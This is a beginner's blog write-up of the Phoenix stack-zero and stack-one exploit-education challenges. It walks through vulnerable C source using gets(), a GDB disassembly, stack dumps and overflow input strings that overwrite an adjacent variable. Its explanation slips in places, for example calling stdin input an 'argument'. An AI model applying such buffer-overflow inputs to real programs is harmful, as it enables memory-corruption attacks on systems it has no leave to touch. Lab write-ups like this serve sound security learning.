---
title: Phoenix Stack-Zero and One
author: Marius Kimmina
date: 2019-10-12 14:10:00 +0800
categories: [CTF, Binary Exploitation]
tags: [Buffer Overflow]
published: true
---

### 0x0. Introduction
Phoenix is an entry level IT-Security challenge hosted at *https://exploit.education/*. It consists of multiple levels introducing participants to the concepts of binary exploitation as well as some network-security fundamentals in later levels. I myself am fairly new to this field and hope to learn a lot during these challenges and will (probably) post my Write-ups for all of them as I advance.


### 0x1. Setup

Download the Phoenix amd64 VM from **https://exploit.education/downloads/**   
The download contains a bash script that you will need to make executable with chmod +x name-of-bash.sh
If you have qemu installed on your system, the VM should begin to boot when you execute the script.

You can of course just do everything within the VM itself, i prefer to ssh into it to have a more familiar shell and copy paste capabilities. If you want to do that as well you will notice that you can not ssh straight to the IP of your VM, instead if you look into the boot script you will find the following line:
```bash
-netdev user,id=unet,hostfwd=tcp:127.0.0.1:2222-:22 \
```

This means that port 22 of your VM is getting forwarded to localhost or 127.0.0.1 on port 2222.

```bash
ssh user@127.0.0.1 -p 2222
```

and login with user/user which are default credentials as documented on https://exploit.education/phoenix/getting-started/

### 0x2. Taking a look at the source code

The code can be found at https://exploit.education/phoenix/stack-zero/

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
"Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
struct {
char buffer[64];
volatile int changeme;
} locals;

printf("%s\n", BANNER);

locals.changeme = 0;
gets(locals.buffer);

if (locals.changeme != 0)
{
puts("Well done, the 'changeme' variable has been changed!");
} else {
puts(
"Uh oh, 'changeme' has not yet been changed. Would you like to try "
"again?");
}

exit(0);
}
```

Aside from the banner printing, this program does two simple things. It takes one argument and puts it into a variable called buffer which has a size of 64. It also has Integer variable called changeme which gets set to 0 and is never changed. At the end the program checks if "changeme" is still zero and prints a statement depend on the result.
So our challenge here is to change the changeme Variable and for the first level its made pretty obvious that this program is vulnerable to a Bufferoverflow.

There are some things to be noted tho.
##### Why are the variables buffer and chageme in a struct?
Contiguous(adjacent) memory locations are used to store structure members in memory. Or in other words: This way our variables will always end up next to each other in memory.

##### Why is changeme "volatile"?
This tells the compiler to not optimize the usage of this variable,
without the volatile keyword the compiler would just skip the if statement altogether because you know the variable is never changed inside the code so why would the compiler bother to check if it changed anyway?

##### How do you know that this is vulnerable?
We take user input in form of an argument and put it right into the buffer variable with no security checks whatsoever. If you look up the manual page for "gets" you will see the following:

```
Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read
and because gets() will continue to store characters past the end
of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.
```

### 0x3. Exploring and Exploiting the program in GDB

Let's start with taking a look at the assembler code, 'disassemble main' will produce the following output:

```
Dump of assembler code for function main:
0x00000000004005dd <+0>: push rbp
0x00000000004005de <+1>: mov rbp,rsp
0x00000000004005e1 <+4>: sub rsp,0x60
0x00000000004005e5 <+8>: mov DWORD PTR [rbp-0x54],edi
0x00000000004005e8 <+11>: mov QWORD PTR [rbp-0x60],rsi
0x00000000004005ec <+15>: mov edi,0x400680
0x00000000004005f1 <+20>: call 0x400440 <puts@plt>
0x00000000004005f6 <+25>: mov DWORD PTR [rbp-0x10],0x0
0x00000000004005fd <+32>: lea rax,[rbp-0x50]
0x0000000000400601 <+36>: mov rdi,rax
0x0000000000400604 <+39>: call 0x400430 <gets@plt>
0x0000000000400609 <+44>: mov eax,DWORD PTR [rbp-0x10]
0x000000000040060c <+47>: test eax,eax
0x000000000040060e <+49>: je 0x40061c <main+63>
0x0000000000400610 <+51>: mov edi,0x4006d0
0x0000000000400615 <+56>: call 0x400440 <puts@plt>
0x000000000040061a <+61>: jmp 0x400626 <main+73>
0x000000000040061c <+63>: mov edi,0x400708
0x0000000000400621 <+68>: call 0x400440 <puts@plt>
0x0000000000400626 <+73>: mov edi,0x0
0x000000000040062b <+78>: call 0x400450 <exit@plt>
End of assembler dump.
```

Now I set two break points one before our input but with the stack already in place and one after our input, in this case I choose:

```
break *0x4005e5
break *0x400626
```

Now to have a good view on what happens on the stack I define a command "stack" that will print all words associated with it

```
gdb➤ define stack
Type commands for definition of "stack".
End with a line saying just "end"
>x/25wx $rsp
>end
```

now type "run" followed by "stack" and you should see the following output

```
0x7fffffffe5d0: 0x00000000 0x00000000 0x00000000 0x00000000
0x7fffffffe5e0: 0x00000000 0x00000000 0x00000000 0x00000000
0x7fffffffe5f0: 0x00000000 0x00000000 0x00000000 0x00000000
0x7fffffffe600: 0x00000000 0x00000000 0xffffe688 0x00007fff
0x7fffffffe610: 0x00000001 0x00000000 0xffffe698 0x00007fff
0x7fffffffe620: 0x004005dd 0x00000000 0x00000000 0x00000000
0x7fffffffe630: 0x00000001
```

This is our Stack with rsp at 0x7fffffffe5d0 and rbp at 0x7fffffffe630.  
But we still need to know where our "changeme" variable is located to solve this challenge meaningful.
We know from the source code that changeme gets first initialized and later set to 0, since there is only one variable
getting set to zero in this code its pretty easy to find:

```
0x00000000004005f6 <+25>: mov DWORD PTR [rbp-0x10],0x0
```

Therefore, changeme is located at rbp-0x10 or 0x7fffffffe620.  
Hit run again this time you should get prompted for input, a commonly used pattern for that can easily be recognized in memory is the alphabet.
In case you are to lazy to craft your own input this one will do:

```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

This will of course already give you the "Well done, the 'changeme' variable has been changed!" output, but lets see what's really going on.
You should have hit the second breakpoint now so type "stack" again and see what changed.

```
0x7fffffffe5d0: 0xffffe688 0x00007fff 0x00000000 0x00000001
0x7fffffffe5e0: 0x41414141 0x42424242 0x43434343 0x44444444
0x7fffffffe5f0: 0x45454545 0x46464646 0x47474747 0x48484848
0x7fffffffe600: 0x49494949 0x4a4a4a4a 0x4b4b4b4b 0x4c4c4c4c
0x7fffffffe610: 0x4d4d4d4d 0x4e4e4e4e 0x4f4f4f4f 0x50505050
0x7fffffffe620: 0x51515151 0x52525252 0x53535353 0x54545454
0x7fffffffe630: 0x55555555
```

I have to admit I have no idea why our input starts at 0x7fffffffe5e0 and not 0x7fffffffe5d0, so if you do please let me know at mindslave.blog@protonmail.com.
What we can clearly see here tho is that "changeme" got overwritten by the letter Q (0x51), you can just do a quick google search for ASCII-table to know which letter translates to which hexadecimal number.
Knowing this we have not just solved this level but the next one (StackOne) is also trivial since all you have to is to overwrite changeme with a specific value, so just use AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP followed by the value you want "changeme" to have.

```
run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPbYlI
Starting program: /opt/phoenix/amd64/stack-one AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPbYlI
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

This is my first ever blog post and I doubt anyone ever reads it all the way but if you did, thank you very much :)







